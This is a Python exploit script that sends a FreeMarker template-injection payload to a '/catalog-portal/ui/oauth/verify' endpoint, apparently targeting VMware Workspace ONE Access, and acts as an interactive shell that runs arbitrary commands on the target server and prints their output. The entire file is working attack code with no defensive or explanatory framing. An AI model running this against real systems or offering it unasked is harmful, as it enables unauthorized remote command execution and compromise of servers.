import requests
import sys


def encode_all(string):
    return "".join("%{0:0>2}".format(format(ord(char), "x")) for char in string)


def main(command):
    url = sys.argv[1] + "/catalog-portal/ui/oauth/verify?error=&deviceUdid="
    # This is the payload that will be sent to the server
    # command = input("Enter the command to execute: ")
    unencoded_payload = '''${"freemarker.template.utility.Execute"?new()("''' + \
        command + '''")}'''
    # URL encode every character in command
    payload = encode_all(unencoded_payload)
    # print("[+] Sending payload: " + payload)

    # This is the headers that will be used to send the payload
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "0",
    }

    # This is the request that will be sent to the server
    request = requests.get(url + payload, headers=headers)
    # This is the response that will be received from the server
    response = request.text
    # This is the output that will be displayed to the user
    output = ""
    try:
        output = response.split("device id: ")[1].split("\\n, device type")[0]
    except:
        if response.find("---begin-message---") != -1:
            output = response.split("---begin-message---")[1].split("---end-message---")[0]
        else:
            output = response
    # Convert all of the \n to a proper newline
    output = output.replace("\\n", "\n")
    print(output)
    print()


if __name__ == "__main__":
    if sys.argv[1] == "--help":
        print("Usage: python3 run.py <URL>")
    else:
        # Loop until the user exits the program
        while True:
            command = input("$: ")
            if command == "exit":
                break
            else:
                main(command)
